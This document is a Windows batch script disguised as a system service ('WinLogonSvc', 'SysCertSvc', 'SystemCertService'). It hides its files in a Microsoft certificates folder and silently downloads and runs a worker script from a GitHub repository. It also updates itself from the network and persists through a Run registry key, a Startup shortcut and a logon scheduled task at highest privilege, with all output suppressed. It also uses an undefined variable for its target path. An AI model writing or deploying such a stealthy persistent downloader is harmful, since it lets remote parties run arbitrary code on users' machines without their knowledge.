@echo off
setlocal enabledelayedexpansion

:: =================================================================================
:: WinLogonSvc
:: Version: 1.0
:: Task: Check the integrity of the Executor script and run it.
:: =================================================================================

set "LAUNCHER_VERSION=1.0"
set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
set "LAUNCHER_SCRIPT_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/WinLogonSvc.bat"

set "WORKER_SCRIPT_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/restore_worker.bat"
set "WORKER_HASH_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/worker_hash.txt"

set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
set "workerScriptPath=%secretPath%\restore_worker.bat"
set "launcherScriptPath=%secretPath%\WinLogonSvc.bat"

curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 5 2>nul
if exist "%secretPath%\lv.tmp" (
    set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
    del /f /q "%secretPath%\lv.tmp" >nul 2>&1
    if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 10 2>nul
        if exist "%launcherScriptPath%.new" (
            (echo @echo off & echo timeout /t 2 /nobreak > nul & echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%" > nul & echo del /f /q "%~f0" > nul) > "%secretPath%\ul.bat"
            start "" /B "%secretPath%\ul.bat"
            goto :eof
        )
    )
)

set "WORKER_HASH_OBFUSCATED="
curl -sL "%WORKER_HASH_URL%" -o "%secretPath%\wh.tmp" --connect-timeout 5 2>nul
if exist "%secretPath%\wh.tmp" (
    set /p WORKER_HASH_OBFUSCATED=<"%secretPath%\wh.tmp"
    del /f /q "%secretPath%\wh.tmp" >nul 2>&1
)

set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
set "targetPath=%secretPath%\%launcherFile%"

reg query "%regKey%" /v "SysCertSvc" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "%regKey%" /v "SysCertSvc" /t REG_SZ /d "\"!targetPath!\"" /f >nul
)

if not exist "%shortcutPath%" (
    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%shortcutPath%'); $s.TargetPath = '%targetPath%'; $s.Save()" >nul 2>&1
)

schtasks /create /tn "SystemCertService" /tr "\"!targetPath!\"" /sc onlogon /rl HIGHEST /f >nul 2>&1

set "workerOK=0"
if exist "%workerScriptPath%" (
    set "goldenHash=" & for /l %%a in (0,1,256) do if defined WORKER_HASH_OBFUSCATED (set "char=!WORKER_HASH_OBFUSCATED:~%%a,1!" & if defined char set "goldenHash=!char!!goldenHash!")
    set "currentHash=" & for /f "skip=1 tokens=*" %%i in ('certutil -hashfile "%workerScriptPath%" SHA256') do if not defined currentHash set "currentHash=%%i"
    if "!currentHash: =!" == "!goldenHash!" set "workerOK=1"
)

if !workerOK! == 0 (
    del /f /q "%workerScriptPath%" >nul 2>&1
    curl -sL "%WORKER_SCRIPT_URL%" -o "%workerScriptPath%" --connect-timeout 15 2>nul
)

if exist "%workerScriptPath%" (
    call "%workerScriptPath%"
)

:eof
endlocal
exit /b